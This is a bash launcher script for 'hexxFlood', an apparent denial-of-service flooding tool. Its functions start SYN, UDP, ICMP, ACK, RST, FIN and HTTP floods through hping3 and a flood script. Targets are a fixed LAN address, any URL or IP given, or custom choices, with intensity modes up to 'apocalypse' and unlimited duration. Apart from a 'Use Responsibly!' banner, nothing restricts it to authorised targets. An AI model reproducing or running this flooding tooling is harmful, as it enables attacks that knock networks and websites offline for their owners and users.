#!/bin/bash

# ============================================================
# hexxFlood - Quick Launcher Script
# Version: 2.0
# ============================================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

show_banner() {
    echo -e "${RED}"
    echo "╔════════════════════════════════════════════════════════════════════════════════╗"
    echo "║                                                                                ║"
    echo "║   ██╗  ██╗███████╗██╗  ██╗██╗  ██╗███████╗██╗      ██████╗  ██████╗ ██████╗    ║"
    echo "║   ██║  ██║██╔════╝╚██╗██╔╝╚██╗██╔╝██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗   ║"
    echo "║   ███████║█████╗   ╚███╔╝  ╚███╔╝ █████╗  ██║     ██║   ██║██║   ██║██║  ██║   ║"
    echo "║   ██╔══██║██╔══╝   ██╔██╗  ██╔██╗ ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║   ║"
    echo "║   ██║  ██║███████╗██╔╝ ██╗██╔╝ ██╗██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝   ║"
    echo "║   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝    ║"
    echo "║                                                                                ║"
    echo "║                              Quick Launcher v2.0                               ║"
    echo "║                                Use Responsibly!                                ║"
    echo "╠════════════════════════════════════════════════════════════════════════════════╣"
    echo "║                             Author: CyWarX                                     ║"
    echo "╚════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

show_help() {
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}📖 hexxFlood - Quick Launcher Help${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}Usage:${NC}"
    echo "  ./quick.sh [COMMAND] [OPTIONS]"
    echo ""
    echo -e "${YELLOW}Commands:${NC}"
    echo "  local              - Attack local network (192.168.1.14) - Extreme"
    echo "  local-high         - Attack local network - High mode"
    echo "  local-nuke         - Attack local network - Apocalypse (60s, max overdrive)"
    echo "  local-test         - Attack local network - Test (30 seconds)"
    echo "  web URL            - Attack web URL (http://example.com) - Extreme"
    echo "  web-high URL       - Attack web URL - High mode"
    echo "  web-test URL       - Attack web URL - Test (30 seconds)"
    echo "  lab IP             - Attack lab network - High mode"
    echo "  custom IP          - Custom attack with prompts"
    echo "  stop               - Stop all attacks"
    echo "  status             - Check attack status"
    echo "  update             - Update hexxFlood to the latest version"
    echo "  help               - Show this help"
    echo ""
    echo -e "${YELLOW}Examples:${NC}"
    echo "  ./quick.sh local"
    echo "  ./quick.sh web http://example.com"
    echo "  ./quick.sh web-high https://example.com"
    echo "  ./quick.sh lab 10.0.0.5"
    echo "  ./quick.sh stop"
    echo ""
}

# Update to the latest version (delegates to the main tool)
run_update() {
    local script_dir
    script_dir="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"
    bash "$script_dir/hexxFlood.sh" --update
}

# Attack functions
attack_local() {
    echo -e "${GREEN}🔥 Starting local attack (Extreme) on 192.168.1.14${NC}"
    sudo hexxFlood -t 192.168.1.14 -m extreme
}

attack_local_high() {
    echo -e "${GREEN}🔥 Starting local attack (High) on 192.168.1.14${NC}"
    sudo hexxFlood -t 192.168.1.14 -m high
}

attack_local_nuke() {
    echo -e "${GREEN}☢️  Starting local attack (Apocalypse, 60s) on 192.168.1.14${NC}"
    sudo hexxFlood -t 192.168.1.14 -m apocalypse -D 60
}

attack_local_test() {
    echo -e "${GREEN}🔥 Starting local test (Easy, 30s) on 192.168.1.14${NC}"
    sudo hexxFlood -t 192.168.1.14 -m easy -D 30
}

attack_web() {
    local url="$1"
    if [ -z "$url" ]; then
        echo -e "${RED}❌ Please provide a URL${NC}"
        echo "Usage: ./quick.sh web http://example.com"
        return 1
    fi
    echo -e "${GREEN}🌐 Starting web attack (Extreme) on $url${NC}"
    sudo hexxFlood -u "$url" -m extreme
}

attack_web_high() {
    local url="$1"
    if [ -z "$url" ]; then
        echo -e "${RED}❌ Please provide a URL${NC}"
        echo "Usage: ./quick.sh web-high https://example.com"
        return 1
    fi
    echo -e "${GREEN}🌐 Starting web attack (High) on $url${NC}"
    sudo hexxFlood -u "$url" -m high
}

attack_web_test() {
    local url="$1"
    if [ -z "$url" ]; then
        echo -e "${RED}❌ Please provide a URL${NC}"
        echo "Usage: ./quick.sh web-test http://example.com"
        return 1
    fi
    echo -e "${GREEN}🌐 Starting web test (Easy, 30s) on $url${NC}"
    sudo hexxFlood -u "$url" -m easy -D 30
}

attack_lab() {
    local ip="$1"
    if [ -z "$ip" ]; then
        echo -e "${RED}❌ Please provide an IP address${NC}"
        echo "Usage: ./quick.sh lab 10.0.0.5"
        return 1
    fi
    echo -e "${GREEN}🔬 Starting lab attack (High) on $ip${NC}"
    sudo hexxFlood -t "$ip" -m high -P 80,443,22 -T syn,udp,icmp
}

attack_custom() {
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}Custom Attack Setup${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    read -p "Target IP or URL (e.g., 192.168.1.10 or http://example.com): " target
    
    if [[ "$target" == http* ]] || [[ "$target" == https* ]]; then
        echo "Web target detected"
        read -p "Threads (1-200, default: 50): " threads
        threads=${threads:-50}
        read -p "Mode (easy/medium/high/extreme/apocalypse, default: high): " mode
        mode=${mode:-high}
        read -p "Duration in seconds (0=infinite, default: 0): " duration
        duration=${duration:-0}
        
        echo -e "${GREEN}Starting custom web attack on $target${NC}"
        sudo hexxFlood -u "$target" -p "$threads" -m "$mode" -D "$duration"
    else
        read -p "Threads (1-200, default: 50): " threads
        threads=${threads:-50}
        read -p "Mode (easy/medium/high/extreme/apocalypse, default: high): " mode
        mode=${mode:-high}
        read -p "Attack types (syn,udp,icmp,ack,rst,fin,all, default: all): " types
        types=${types:-all}
        read -p "Duration in seconds (0=infinite, default: 0): " duration
        duration=${duration:-0}
        
        echo -e "${GREEN}Starting custom attack on $target${NC}"
        sudo hexxFlood -t "$target" -p "$threads" -m "$mode" -T "$types" -D "$duration"
    fi
}

attack_stop() {
    echo -e "${YELLOW}🛑 Stopping all attacks...${NC}"
    sudo pkill -9 hping3 2>/dev/null
    sudo pkill -9 -f http_flood.py 2>/dev/null
    rm -f /tmp/http_flood.py 2>/dev/null
    echo -e "${GREEN}✅ All attacks stopped${NC}"
}

attack_status() {
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}hexxFlood Status${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # NOTE: `pgrep -c` already prints 0 (and exits 1) on no match, so a trailing
    # `|| echo 0` would append a SECOND 0 and break the numeric tests below.
    HPING_COUNT=$(pgrep -c hping3 2>/dev/null); HPING_COUNT=${HPING_COUNT:-0}
    HTTP_COUNT=$(pgrep -cf http_flood.py 2>/dev/null); HTTP_COUNT=${HTTP_COUNT:-0}

    if [ "$HPING_COUNT" -gt 0 ] || [ "$HTTP_COUNT" -gt 0 ]; then
        echo -e "${GREEN}✅ Attacks are running${NC}"
        echo ""
        echo -e "${YELLOW}Active Processes:${NC}"
        echo "  hping3: $HPING_COUNT"
        echo "  HTTP: $HTTP_COUNT"
        echo ""
        
        # Show network stats
        INTERFACE="wlan0"
        RX=$(ifconfig $INTERFACE 2>/dev/null | grep "RX packets" | awk '{print $5}'); RX=${RX:-0}
        TX=$(ifconfig $INTERFACE 2>/dev/null | grep "TX packets" | awk '{print $5}'); TX=${TX:-0}
        echo -e "${YELLOW}Network Stats ($INTERFACE):${NC}"
        echo "  TX: $(printf "%'d" $TX) packets"
        echo "  RX: $(printf "%'d" $RX) packets"
        echo ""
        
        # Show CPU
        CPU=$(top -bn1 | head -5 | grep Cpu | awk '{print $2}')
        echo -e "${YELLOW}CPU Usage:${NC} ${CPU:-0}%"
        
        # Show Memory
        MEM=$(free -h | grep Mem | awk '{print $3 "/" $2}')
        echo -e "${YELLOW}Memory:${NC} $MEM used"
    else
        echo -e "${RED}❌ No attacks are running${NC}"
    fi
}

# Main
main() {
    show_banner
    
    case $1 in
        local)
            attack_local
            ;;
        local-high)
            attack_local_high
            ;;
        local-nuke)
            attack_local_nuke
            ;;
        local-test)
            attack_local_test
            ;;
        web)
            attack_web "$2"
            ;;
        web-high)
            attack_web_high "$2"
            ;;
        web-test)
            attack_web_test "$2"
            ;;
        lab)
            attack_lab "$2"
            ;;
        custom)
            attack_custom
            ;;
        stop)
            attack_stop
            ;;
        status)
            attack_status
            ;;
        update)
            run_update
            ;;
        help|--help|-h)
            show_help
            ;;
        *)
            echo -e "${RED}❌ Unknown command: $1${NC}"
            echo ""
            show_help
            exit 1
            ;;
    esac
}

# Run main
main "$@"
